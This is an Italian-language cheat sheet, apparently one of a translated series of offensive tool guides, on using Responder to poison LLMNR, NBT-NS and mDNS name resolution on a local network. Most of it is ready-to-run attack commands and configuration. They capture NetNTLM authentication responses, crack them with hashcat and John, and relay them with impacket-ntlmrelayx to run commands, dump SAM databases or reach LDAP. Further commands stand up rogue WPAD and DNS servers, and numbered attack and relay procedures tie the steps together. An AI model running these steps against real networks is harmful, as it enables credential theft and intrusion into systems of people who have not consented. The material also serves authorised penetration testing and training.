# 🎣 Responder - Avvelenamento di LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               Avvelenamento LLMNR/NBT-NS/mDNS
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

> **Correzioni dell’originale:** i dati acquisiti sono risposte challenge/response NetNTLM, non direttamente l’hash NT della password. Il flag `--lm` forza un downgrade LM, non “solo NTLMv2”; `-d` riguarda DHCP, non l’abilitazione di un server DNS. Anche `-wF` e le altre opzioni vanno interpretati secondo la release, non come garanzia di autenticazione Basic o di riuscita. Il relay dipende da firma SMB, protezioni del protocollo e permessi del bersaglio; non richiede necessariamente il recupero preliminare della password. Percorsi, porte e opzioni conservano gli esempi originali. Vedi le [opzioni ufficiali Responder](https://github.com/lgandx/Responder).

---

## 📋 Indice

- [Che cos'è Responder](#-che-cosè-responder)
- [Installazione](#-installazione)
- [Utilizzo di base](#-utilizzo-di-base)
- [Acquisizione degli hash NTLMv2](#-acquisizione-degli-hash-ntlmv2)
- [Attacchi di relay](#-attacchi-di-relay)
- [Server contraffatti (rogue server)](#-server-contraffatti-rogue-server)
- [Configurazione](#-configurazione)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Responder

**Responder** falsifica le risposte LLMNR, NBT-NS e mDNS per acquisire gli hash NTLM:

- 🎣 **Avvelenamento LLMNR** - Link-Local Multicast Name Resolution
- 📡 **Avvelenamento NBT-NS** - NetBIOS Name Service
- 🍎 **Avvelenamento mDNS** - Multicast DNS
- 🔓 **Acquisizione degli hash** - Hash NTLMv1/NTLMv2
- 🔄 **Supporto relay** - Attacchi di inoltro dell'autenticazione NTLM

### Come funziona

```
1. L’utente digita un nome host errato: \\fileservr (errore di battitura)
2. La risoluzione DNS fallisce
3. Windows invia una query LLMNR/NBT-NS in broadcast
4. Responder risponde: "I'm fileservr!" (sono fileservr)
5. La vittima invia l’hash NTLM per autenticarsi
6. L’hash viene acquisito per il recupero della password o il relay
```

---

## 🚀 Installazione

### Kali Linux

```bash
# Preinstallato
responder --help

# Aggiorna
sudo apt update && sudo apt install responder

# Oppure da GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Verifica

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Utilizzo di base

### Avvia Responder

```bash
# Di base (acquisisce gli hash)
sudo responder -I eth0

# Output dettagliato
sudo responder -I eth0 -v

# Modalità di analisi (passiva)
sudo responder -I eth0 -A
```

### Selezione dell'interfaccia

```bash
# Ethernet
sudo responder -I eth0

# Wireless
sudo responder -I wlan0

# Elenca le interfacce
ip a
```

---

## 🔓 Acquisizione degli hash NTLMv2

### Acquisizione di base

```bash
# Avvia Responder
sudo responder -I eth0

# Attendi le vittime...
# Output:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Forza NTLMv2

```bash
# Solo NTLMv2 (consigliato nell'originale per il recupero delle password)
sudo responder -I eth0 --lm
```

### Acquisizione WPAD

```bash
# Abilita il proxy WPAD
sudo responder -I eth0 -w

# Forza l'autenticazione WPAD
sudo responder -I eth0 -wF
```

### Posizioni degli hash

```bash
# Gli hash acquisiti vengono salvati in:
/usr/share/responder/logs/
# Oppure
./logs/

# File:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Recupera le password dagli hash acquisiti

```bash
# Formato NTLMv2:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (modalità 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

## 🔄 Attacchi di relay

### Disabilita SMB/HTTP (per il relay)

```bash
# Modifica Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Imposta:
SMB = Off
HTTP = Off
```

### Responder + ntlmrelayx

```bash
# Terminale 1: Responder (senza SMB/HTTP)
sudo responder -I eth0

# Terminale 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Oppure con esecuzione di comandi
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Relay verso LDAP

```bash
# Responder
sudo responder -I eth0

# Relay verso LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Relay per estrarre il SAM

```bash
# Estrai il SAM tramite relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

## 🖥 Server contraffatti (rogue server)

### Server integrati

| Server | Porta | Scopo |
|--------|------|---------|
| SMB | 445 | Autenticazione delle condivisioni di file |
| HTTP | 80 | Autenticazione web |
| HTTPS | 443 | Web sicuro |
| FTP | 21 | Autenticazione FTP |
| SQL | 1433 | Autenticazione MSSQL |
| LDAP | 389 | Autenticazione della directory |
| WPAD | 80 | Configurazione proxy |

### Abilita/disabilita i server

```bash
# Modifica Responder.conf
[Responder Core]
; Server da avviare
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Proxy WPAD contraffatto

```bash
# Abilita WPAD
sudo responder -I eth0 -w

# Forza l'autenticazione Basic su WPAD
sudo responder -I eth0 -wF

# Script WPAD personalizzato
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### Spoofing DNS

```bash
# Abilita DNS
sudo responder -I eth0 -d

# Responder diventa un server DNS
# Risponde alle query per tutti gli host
```

---

## ⚙ Configurazione

### Responder.conf

```bash
# Posizione
/usr/share/responder/Responder.conf
# Oppure
./Responder.conf
```

### Impostazioni principali

```ini
[Responder Core]
; Imposta su On oppure Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Challenge personalizzata (per rainbow table)
Challenge = Random

; Non rispondere alle query locali
DontRespondTo =

; Rispondi solo a questi IP
RespondTo =
```

### Challenge statica (rainbow table)

```ini
; Imposta una challenge statica per tabelle precalcolate
Challenge = 1122334455667788
```

### Esclusioni

```ini
; Non rispondere a questi IP
DontRespondTo = 192.168.1.1, 192.168.1.2

; Rispondi solo a questi
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Riferimento rapido

### Comandi essenziali

| Comando | Descrizione |
|---------|-------------|
| `responder -I eth0` | Acquisizione di base |
| `responder -I eth0 -v` | Modalità dettagliata |
| `responder -I eth0 -A` | Solo analisi |
| `responder -I eth0 -w` | Abilita WPAD |
| `responder -I eth0 -wF` | Forza l'autenticazione WPAD |
| `responder -I eth0 -d` | Abilita DNS |

### Flag

| Flag | Descrizione |
|------|-------------|
| `-I` | Interfaccia |
| `-v` | Output dettagliato |
| `-A` | Modalità di analisi (passiva) |
| `-w` | Abilita WPAD |
| `-wF` | Forza l'autenticazione WPAD |
| `-d` | Abilita DNS |
| `-f` | Identifica gli host (fingerprinting) |
| `-b` | Restituisci autenticazione Basic |

### Tipi di hash

| Tipo | Modalità Hashcat | Formato John |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Procedura di attacco

```bash
# 1. Avvia Responder
sudo responder -I eth0 -wFv

# 2. Attendi gli hash
# Hash salvati in ./logs/

# 3. Recupera le password dagli hash
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Oppure usa il relay (disabilita prima SMB)
sudo responder -I eth0  # SMB=Off nella configurazione
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Procedura di relay

```bash
# 1. Trova bersagli senza firma SMB
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Configura Responder.conf
# SMB = Off
# HTTP = Off

# 3. Avvia Responder
sudo responder -I eth0

# 4. Avvia il relay
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Attendi l'autenticazione inoltrata
```

---

## 📚 Risorse

- [Responder GitHub](https://github.com/lgandx/Responder)
- [Avvelenamento LLMNR](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Schede correlate
- [Impacket](../../Impacket/translations/README.it.md)
- [CrackMapExec](../../CrackMapExec/translations/README.it.md)
- [Hashcat](../../Hashcat/translations/README.it.md)

---

<p align="center">
  <b>🎣 Acquisisci gli hash!</b><br>
  <i>Responder - Lo strumento per acquisire credenziali dalla rete</i>
</p>
